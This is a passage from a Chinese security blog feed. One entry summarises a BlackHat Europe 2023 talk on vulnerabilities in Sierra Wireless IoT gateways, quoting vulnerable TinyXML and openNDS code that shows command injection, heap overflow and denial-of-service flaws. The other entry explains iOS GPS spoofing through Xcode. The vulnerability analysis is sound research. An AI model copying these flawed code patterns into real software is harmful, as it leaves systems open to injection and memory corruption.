      <category term="BMP" scheme="https://programlife.net/tags/BMP/"/>
    
      <category term="PCX" scheme="https://programlife.net/tags/PCX/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat Europe 2023 议题学习（一）</title>
    <link href="https://programlife.net/2024/01/06/BHEU-2023-Learning-Part1/"/>
    <id>https://programlife.net/2024/01/06/BHEU-2023-Learning-Part1/</id>
    <published>2024-01-06T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.blackhat.com/eu-23/briefings/schedule/index.html#old-code-dies-hard-finding-new-vulnerabilities-in-old-third-party-software-components-and-the-importance-of-having-sbom-for-iotot-devices-35349" target="_blank" rel="noopener"><strong>Old code dies hard:</strong> Finding new vulnerabilities in old third-party software components and the importance of having SBoM for IoT/OT devices</a></p><a id="more"></a><h2 id="0x01-研究思路"><a href="#0x01-研究思路" class="headerlink" title="0x01. 研究思路"></a>0x01. 研究思路</h2><p>研究目标：Sierra Wireless AirLink Gateways</p><p>目标搜集：Shodan 搜索 ACEmanager 的指纹</p><ul><li>ACEmanager 是 Sierra Wireless AirLink Gateways 的 Web 管理系统</li><li>ACEmanager 不应该暴露在公网</li></ul><p>前人研究：</p><ul><li>Cisco Talos、IOActive 等都开展过相关研究，但更多关注目标本身的代码，比如 ACEmanager 等</li><li>没有提及第三方组件的漏洞问题</li></ul><p>作者的研究思路：</p><ul><li>获取设备、固件、软件包</li><li>固件解压、解密<ul><li>老版本的固件没有加密，还带有调试符号</li><li>新版本的固件可以用 IOActive 的公开方法解密</li><li>使用 Qemu 来模拟运行环境</li></ul></li><li>黑盒功能分析</li><li>软件成分分析（SCA）</li><li>对高优目标（二进制、开源组件等）进行静态、动态分析<ul><li>根据 SCA 分析的结果，挑选高优目标开展研究<ul><li>可暴露在公网的 ACEmanager</li><li>可通过 Telnet 配置的 AT 命令接口</li><li>开源组件，尤其是没怎么爆过漏洞的组件</li></ul></li><li>提到了 SBoM / Software Bill of Materials，即软件物料清单，可以简单理解为 SCA 的分析结果（但是是标准化的数据）<ul><li>关于 SBoM 的应用，可以阅读 <a href="https://www.openeuler.org/zh/blog/robell/openEuler_SBOM_Practice.html" target="_blank" rel="noopener">基于 SBOM 的开源社区软件供应链安全解决方案</a></li></ul></li></ul></li></ul><h2 id="0x02-漏洞案例"><a href="#0x02-漏洞案例" class="headerlink" title="0x02. 漏洞案例"></a>0x02. 漏洞案例</h2><h3 id="2-1-TinyXML"><a href="#2-1-TinyXML" class="headerlink" title="2.1 TinyXML"></a>2.1 TinyXML</h3><p>TinyXML 已经被 TinyXML-2 取代，前者不再维护，所以作者选择直接对 TinyXML 进行 Fuzz。</p><h4 id="2-1-1-CVE-2021-42260-CVE-2023-40458"><a href="#2-1-1-CVE-2021-42260-CVE-2023-40458" class="headerlink" title="2.1.1 CVE-2021-42260 / CVE-2023-40458"></a>2.1.1 CVE-2021-42260 / CVE-2023-40458</h4><p>指针 <code>p</code> 指向攻击者可控的 XML 代码，如果 <code>if ( *(p+1) &amp;&amp; *(p+2) )</code> 检查不过，那么 <code>p</code> 会保持不变，可以触发死循环，实现 DoS 攻击。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( p &lt; now )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Treat p as unsigned, so we have a happy compiler.</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>* pU = (<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>*)p;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Code contributed by Fletcher Dunn: (modified by lee)</span></span><br><span class="line">    <span class="keyword">switch</span> (*pU) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> TIXML_UTF_LEAD_0:</span><br><span class="line">        <span class="keyword">if</span> ( encoding == TIXML_ENCODING_UTF8 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( *(p+<span class="number">1</span>) &amp;&amp; *(p+<span class="number">2</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// In these cases, don't advance the column. These are</span></span><br><span class="line">                <span class="comment">// 0-width spaces.</span></span><br><span class="line">                <span class="keyword">if</span> ( *(pU+<span class="number">1</span>)==TIXML_UTF_LEAD_1 &amp;&amp; *(pU+<span class="number">2</span>)==TIXML_UTF_LEAD_2 )</span><br><span class="line">                    p += <span class="number">3</span>; </span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ( *(pU+<span class="number">1</span>)==<span class="number">0xbf</span>U &amp;&amp; *(pU+<span class="number">2</span>)==<span class="number">0xbe</span>U )</span><br><span class="line">                    p += <span class="number">3</span>; </span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ( *(pU+<span class="number">1</span>)==<span class="number">0xbf</span>U &amp;&amp; *(pU+<span class="number">2</span>)==<span class="number">0xbf</span>U )</span><br><span class="line">                    p += <span class="number">3</span>; </span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    &#123; p +=<span class="number">3</span>; ++col; &#125;   <span class="comment">// A normal character.</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ++p;</span><br><span class="line">            ++col;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-1-2-CVE-2023-34194-CVE-2023-40462"><a href="#2-1-2-CVE-2023-34194-CVE-2023-40462" class="headerlink" title="2.1.2 CVE-2023-34194 / CVE-2023-40462"></a>2.1.2 CVE-2023-34194 / CVE-2023-40462</h4><p>触发 <code>assert</code> 实现 DoS 攻击。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> TiXmlBase::StringEqual( <span class="keyword">const</span> <span class="keyword">char</span>* p,</span><br><span class="line">                             <span class="keyword">const</span> <span class="keyword">char</span>* tag,</span><br><span class="line">                             <span class="keyword">bool</span> ignoreCase,</span><br><span class="line">                             TiXmlEncoding encoding )</span><br><span class="line">&#123;</span><br><span class="line">    assert( p );</span><br><span class="line">    assert( tag );</span><br><span class="line">    <span class="keyword">if</span> ( !p || !*p )</span><br><span class="line">    &#123;</span><br><span class="line">        assert( <span class="number">0</span> );    <span class="comment">// assert</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-ALEOS"><a href="#2-2-ALEOS" class="headerlink" title="2.2 ALEOS"></a>2.2 ALEOS</h3><p>ALEOS 即 AirLink Enterprise Operating System，可以理解为 IoT 设备的定制系统，ACEmanager 等都运行在该系统上。这里的漏洞实际上是自研代码的漏洞。</p><h4 id="2-2-1-CVE-2023-40460"><a href="#2-2-1-CVE-2023-40460" class="headerlink" title="2.2.1 CVE-2023-40460"></a>2.2.1 CVE-2023-40460</h4><p>XML 上传 XSS 漏洞：</p><ul><li>内容几乎没有校验</li><li>扩展名可以任意指定</li><li>配合奇怪的路径处理逻辑，最终可以上传 HTML 并且可以通过 URL 访问</li></ul><p>前提条件：需要先登录 ACEmanager 再发起上传操作。</p><h4 id="2-2-2-CVE-2018-4063"><a href="#2-2-2-CVE-2018-4063" class="headerlink" title="2.2.2 CVE-2018-4063"></a>2.2.2 CVE-2018-4063</h4><p>这是作者提到的 Cisco Talos 发现的一个漏洞，这里笔者简单补充一下，细节可参考 <a href="https://talosintelligence.com/vulnerability_reports/TALOS-2018-0748" target="_blank" rel="noopener">TALOS-2018-0748</a>。</p><blockquote><p>When uploading template files, you can specify the name of the file that you are uploading. There are no restrictions in place that protect the files that are currently on the device, used for normal operation. If a file is uploaded with the same name of the file that already exists in the directory, then we inherit the permissions of that file. In this case, the files that exist in the directory that the template file is saved to are:</p><ul><li><code>fw_expected_rm.cgi</code></li><li><code>fw_status.cgi</code></li><li><code>fw_upload_init.cgi</code></li><li><code>fw_upload_init.sh</code></li><li><code>rm_switching_action.cgi</code></li></ul><p>These files all have executable permissions on the device. By uploading a small wrapper, we can upload arbitrary code to the device and run by simply navigating to the web page through the browser. Since ACEManager is running as <code>root</code> any executables run will be running also as <code>root</code>.</p></blockquote><p>即上传同名文件覆盖原有文件，可以继承原有文件的可执行权限；而通过浏览特定的 Web 页面，可以触发这些 cgi 代码的执行；最终实现 <code>root</code> 权限代码执行。另外，这个也需要先登录 ACEmanager 才能发起攻击。</p><h3 id="2-3-硬编码问题"><a href="#2-3-硬编码问题" class="headerlink" title="2.3 硬编码问题"></a>2.3 硬编码问题</h3><ol><li>内置 TLS 证书和私钥（默认使用）</li><li>调试 Shell root 用户硬编码密码 SHA512 哈希值（功能默认禁用）</li></ol><h3 id="2-4-openNDS"><a href="#2-4-openNDS" class="headerlink" title="2.4 openNDS"></a>2.4 openNDS</h3><p>openNDS（非 OpenDNS）是一个开源的 Captive Portal 组件（基于另一个开源组件 Nodogsplash 进行的分叉开发），<a href="https://opennds.readthedocs.io/en/stable/" target="_blank" rel="noopener">官方介绍</a>如下：</p><blockquote><p>openNDS (open Network Demarcation Service) is a high performance, small footprint, Captive Portal. It provides a border control gateway between a public local area network and the Internet.</p></blockquote><p>Captive Portal 在日常生活中非常常见，比如连接机场 WiFi 时出现的认证系统，就是类似 openNDS 这样的组件在工作。</p><p>作者在确认所依赖的 openNDS 版本之后，去分析了此版本号之后提交的 commit（因为没有公开的 CVE，所以直接跟着 Patch 来分析），尝试根据 commit 来寻找漏洞（或者没有补完的同类漏洞变种）。</p><h4 id="2-4-1-CVE-2023-38320"><a href="#2-4-1-CVE-2023-38320" class="headerlink" title="2.4.1 CVE-2023-38320"></a>2.4.1 CVE-2023-38320</h4><p>如果收到的 HTTP 请求不带 User-Agent 字段，可以触发空指针引用实现 DoS（在 Patch <a href="https://github.com/openNDS/openNDS/commit/b97bf3566071a8176c6e1add9af9abbfa6d89173" target="_blank" rel="noopener">b97bf35</a> 中可以看到 <code>do_binauth</code> 对应的 CVE 为 CVE-2023-38322，此外作者还发现了一些其他空指针引用问题，可以参考 <a href="https://github.com/openNDS/openNDS/releases/tag/v10.1.2" target="_blank" rel="noopener">OpenNDS v10.1.2 release</a>）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">show_preauthpage</span><span class="params">(struct MHD_Connection *connection, <span class="keyword">const</span> <span class="keyword">char</span> *query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s_config *config = config_get_config();</span><br><span class="line">    <span class="keyword">char</span> *msg;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *user_agent;</span><br><span class="line">    <span class="keyword">char</span> *enc_user_agent;</span><br><span class="line">    <span class="keyword">char</span> *preauthpath;</span><br><span class="line">    <span class="keyword">char</span> *cmd;</span><br><span class="line">    <span class="keyword">char</span> *enc_query;</span><br><span class="line">    <span class="keyword">int</span> rc;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">MHD_Response</span> *<span class="title">response</span>;</span></span><br><span class="line">    preauthpath = safe_calloc(SMALL_BUF);</span><br><span class="line">    safe_asprintf(&amp;preauthpath, <span class="string">"/%s/"</span>, config-&gt;preauthdir);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(preauthpath, config-&gt;fas_path) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">free</span> (preauthpath);</span><br><span class="line">        user_agent = safe_calloc(USER_AGENT);</span><br><span class="line">        enc_user_agent = safe_calloc(ENC_USER_AGENT);</span><br><span class="line"></span><br><span class="line">        MHD_get_connection_values(connection, MHD_HEADER_KIND, get_user_agent_callback, &amp;user_agent);</span><br><span class="line"></span><br><span class="line">        uh_urlencode(enc_user_agent, ENC_USER_AGENT, user_agent, <span class="built_in">strlen</span>(user_agent));  <span class="comment">// strlen(NULL)</span></span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-2-CVE-2023-38316"><a href="#2-4-2-CVE-2023-38316" class="headerlink" title="2.4.2 CVE-2023-38316"></a>2.4.2 CVE-2023-38316</h4><p>URL <code>unescape</code> 存在命令注入漏洞。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> unescape(<span class="keyword">void</span> * cls, struct MHD_Connection *c, <span class="keyword">char</span> *src)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *unescapecmd;</span><br><span class="line">    <span class="keyword">char</span> *msg;</span><br><span class="line"></span><br><span class="line">    debug(LOG_DEBUG, <span class="string">"Escaped string=%s\n"</span>, src);</span><br><span class="line"></span><br><span class="line">    unescapecmd = safe_calloc(QUERYMAXLEN);</span><br><span class="line">    msg = safe_calloc(QUERYMAXLEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 命令注入</span></span><br><span class="line">    <span class="built_in">snprintf</span>(unescapecmd, QUERYMAXLEN, <span class="string">"/usr/lib/opennds/unescape.sh -url \"%s\""</span>, src);</span><br><span class="line">    debug(LOG_DEBUG, <span class="string">"unescapecmd=%s\n"</span>, unescapecmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (execute_ret_url_encoded(msg, <span class="keyword">sizeof</span>(msg) - <span class="number">1</span>, unescapecmd) == <span class="number">0</span>) &#123;</span><br><span class="line">        debug(LOG_DEBUG, <span class="string">"Unescaped string=%s\n"</span>, msg);</span><br><span class="line">        <span class="built_in">strcpy</span>(src, msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(unescapecmd);</span><br><span class="line">    <span class="built_in">free</span>(msg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strlen</span>(src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-3-CVE-2023-41101-CVE-2023-40465"><a href="#2-4-3-CVE-2023-41101-CVE-2023-40465" class="headerlink" title="2.4.3 CVE-2023-41101 / CVE-2023-40465"></a>2.4.3 CVE-2023-41101 / CVE-2023-40465</h4><p><code>preauthenticated</code> 存在 Query String 解析堆溢出漏洞（老版本是栈溢出漏洞）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">preauthenticated</span><span class="params">(struct MHD_Connection *connection, <span class="keyword">const</span> <span class="keyword">char</span> *url, t_client *client)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s_config *config = config_get_config();</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *host = config-&gt;gw_address;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *accept = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *redirect_url;</span><br><span class="line">    <span class="keyword">char</span> *query;</span><br><span class="line">    <span class="keyword">char</span> *querystr;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for preauthdir</span></span><br><span class="line">    <span class="keyword">if</span> (check_authdir_match(url, config-&gt;preauthdir)) &#123;</span><br><span class="line"></span><br><span class="line">        debug(LOG_DEBUG, <span class="string">"preauthdir url detected: %s"</span>, url);</span><br><span class="line">        query = safe_calloc(QUERYMAXLEN);    <span class="comment">// #define QUERYMAXLEN 8192</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!query) &#123;</span><br><span class="line">            ret = send_error(connection, <span class="number">503</span>);</span><br><span class="line">            <span class="built_in">free</span>(query);</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        get_query(connection, &amp;query, QUERYSEPARATOR);  <span class="comment">// Heap Buffer Overflow</span></span><br><span class="line">        debug(LOG_DEBUG, <span class="string">"preauthenticated: show_preauthpage [%s]"</span>, query);</span><br><span class="line">        ret = show_preauthpage(connection, query);</span><br><span class="line">        <span class="built_in">free</span>(query);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// save the query or empty string into **query.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">get_query</span><span class="params">(struct MHD_Connection *connection, <span class="keyword">char</span> **query, <span class="keyword">const</span> <span class="keyword">char</span> *separator)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> element_counter;</span><br><span class="line">    <span class="keyword">char</span> **elements;</span><br><span class="line">    <span class="keyword">char</span> *query_str;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">collect_query</span> <span class="title">collect_query</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="comment">// length 的长度依赖于 URL Query String 内容</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; element_counter; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!elements[i])</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        length += <span class="built_in">strlen</span>(elements[i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) <span class="comment">// q=foo&amp;o=bar the '&amp;' need also some space</span></span><br><span class="line">            length++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; element_counter; i++) &#123;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">        <span class="built_in">strncpy</span>(*query + j, elements[i], length - j);  <span class="comment">// Heap Buffer Overflow</span></span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-4-Root"><a href="#2-4-4-Root" class="headerlink" title="2.4.4 Root"></a>2.4.4 Root</h4><p>作者利用前面的栈溢出漏洞，配合一些其他漏洞实现了设备 Root。</p><h2 id="0x03-HoneyPot"><a href="#0x03-HoneyPot" class="headerlink" title="0x03. HoneyPot"></a>0x03. HoneyPot</h2><p>最后，作者搭建蜜罐收集了一波攻击数据：在各种各样的攻击数据中发现了针对 Sierra Wireless AirLink Gateways 的攻击，但是是直接使用的 Cisco Talos 公布的 PoC，并没有使用 0day 或其他未知漏洞。</p><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04. 小结"></a>0x04. 小结</h2><p>首先是学习作者的研究思路，其次是了解一些常见的漏洞模式。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.blackhat.com/eu-23/briefings/schedule/index.html#old-code-dies-hard-finding-new-vulnerabilities-in-old-third-party-software-components-and-the-importance-of-having-sbom-for-iotot-devices-35349&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;strong&gt;Old code dies hard:&lt;/strong&gt; Finding new vulnerabilities in old third-party software components and the importance of having SBoM for IoT/OT devices&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Conferences" scheme="https://programlife.net/categories/Conferences/"/>
    
      <category term="BlackHat" scheme="https://programlife.net/categories/Conferences/BlackHat/"/>
    
    
      <category term="IoT" scheme="https://programlife.net/tags/IoT/"/>
    
      <category term="TinyXML" scheme="https://programlife.net/tags/TinyXML/"/>
    
      <category term="Captive Portal" scheme="https://programlife.net/tags/Captive-Portal/"/>
    
      <category term="openNDS" scheme="https://programlife.net/tags/openNDS/"/>
    
  </entry>
  
  <entry>
    <title>iOS 设备 GPS 位置模拟</title>
    <link href="https://programlife.net/2021/05/30/ios-device-gps-location-emulation/"/>
    <id>https://programlife.net/2021/05/30/ios-device-gps-location-emulation/</id>
    <published>2021-05-30T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>未越狱 iOS 设备通过 Xcode 修改 GPS 定位信息。</p><a id="more"></a><h2 id="0x01-GPS-坐标简介"><a href="#0x01-GPS-坐标简介" class="headerlink" title="0x01. GPS 坐标简介"></a>0x01. GPS 坐标简介</h2><p>GPS 坐标使用经纬度来表示，有几种不同的规范：</p><ol><li>WGS-84，World Geodetic System，定义于 1984 年，最后修改定于 2004 年，是被 GPS 所使用的国际规范</li><li>GCJ-02，国测局坐标系、火星坐标系，基于 WGS-84 但是会在经纬度中加入看似随机的偏移</li><li>BD-09，百度坐标系，在 GCJ-02 的基础上增加了一次变换</li></ol><p>《中华人民共和国测绘法》要求地图提供商使用 GCJ-02 坐标系统：</p><blockquote><p>使用 GCJ-02 记录下的地点在 GCJ-02 的地图中会显示在正确位置，然而换成 WGS-84 的地图或地点记录就可能造成 100 - 700 米不等的偏移。据测量，Google.com 的地图与真实坐标相差约 50 - 500 米，而中国区的 Google.cn 地图则与卫星图无偏差</p></blockquote><p>实际测试发现 Google.cn 迁移到 Google.com.hk 之后，使用的是 WGS-84 坐标系，其卫星图与地图存在一定的偏移：</p><p><img src="/uploads/202105/google-maps.jpg" alt="火星坐标系偏移"></p><h2 id="0x02-Xcode-真机调试"><a href="#0x02-Xcode-真机调试" class="headerlink" title="0x02. Xcode 真机调试"></a>0x02. Xcode 真机调试</h2><p>在 Xcode 中新建一个 iOS App，并在 iOS Deployment Target 设置好对应的系统版本。</p><p><img src="/uploads/202105/ios-deployment-target.jpg" alt="iOS Deployment Target 设置"></p><p>首次在 iPhone 上调试，会提示如下错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Could not launch “PhoneDemo”</span><br><span class="line">Domain: IDEDebugSessionErrorDomain</span><br><span class="line">Code: 3</span><br><span class="line">Failure Reason: Security</span><br><span class="line">User Info: &#123;</span><br><span class="line">    DVTRadarComponentKey = 855031;</span><br><span class="line">    RawUnderlyingErrorMessage = Security;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/uploads/202105/ide-debug-session-error-domain-security.jpg" alt="DVTRadarComponentKey=855031 RawUnderlyingErrorMessage=Security"></p><p>在 iPhone 的设置里面信任对应的开发者即可。</p><h2 id="0x03-GPS-位置模拟"><a href="#0x03-GPS-位置模拟" class="headerlink" title="0x03. GPS 位置模拟"></a>0x03. GPS 位置模拟</h2><ol><li>通过 <a href="https://lbs.amap.com/tools/picker" target="_blank" rel="noopener">高德地图 API</a> 获取目标位置的 GCJ-02 坐标，比如“深圳市腾讯大厦”的坐标为 <code>113.934497,22.540517</code></li><li>通过 <a href="http://www.dituwa.com/tool/gpxaxes" target="_blank" rel="noopener">转换工具</a> 将坐标转换为 WGS-84 坐标，这里转换后为 <code>113.92962958,22.54354674</code></li><li>在 iOS App 工程中新建一个 location.gpx 文件并设置好 WGS-84 经纬度坐标</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;gpx version=&quot;1.1&quot;</span><br><span class="line">    creator=&quot;GMapToGPX 6.4j - http://www.elsewhere.org/GMapToGPX/&quot;</span><br><span class="line">    xmlns=&quot;http://www.topografix.com/GPX/1/1&quot;</span><br><span class="line">    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">    xsi:schemaLocation=&quot;http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd&quot;&gt;</span><br><span class="line">    &lt;wpt lat=&quot;22.54354674&quot; lon=&quot;113.92962958&quot;&gt;</span><br><span class="line">    &lt;/wpt&gt;</span><br><span class="line">&lt;/gpx&gt;</span><br></pre></td></tr></table></figure><p>此时，需要修改 iOS App 工程设置，选择 <code>Edit Scheme...</code>，在 Run - Options - Core Location 中选中 Allow Location Simulation，其中 Default Location 选中前面添加的 gpx 文件。</p><p><img src="/uploads/202105/ios-location-simulation.jpg" alt=""></p><p>在连接的 iPhone 上运行该 iOS App，即可临时修改 GPS 位置信息。</p><p><img src="/uploads/202105/shenzhen-tencent-building.jpg" alt="深圳市腾讯大厦"></p><p>当然，这种模拟 GPS 位置的方法弊端也很明显，之前看到有人在 HITB 上讲过 <a href="https://cyberweek.ae/materials/2020/COMMSEC%20D2%20-%20Spoofing%20Your%20Location%20on%20iOS%20without%20Jailbreaking.pdf" target="_blank" rel="noopener">PhantomGPS</a>，相对来说方便和灵活了很多，二代售价 400 块。</p><h2 id="0x04-参考文档"><a href="#0x04-参考文档" class="headerlink" title="0x04. 参考文档"></a>0x04. 参考文档</h2><ol><li><a href="https://zh.wikipedia.org/wiki/%E4%B8%96%E7%95%8C%E5%A4%A7%E5%9C%B0%E6%B5%8B%E9%87%8F%E7%B3%BB%E7%BB%9F" target="_blank" 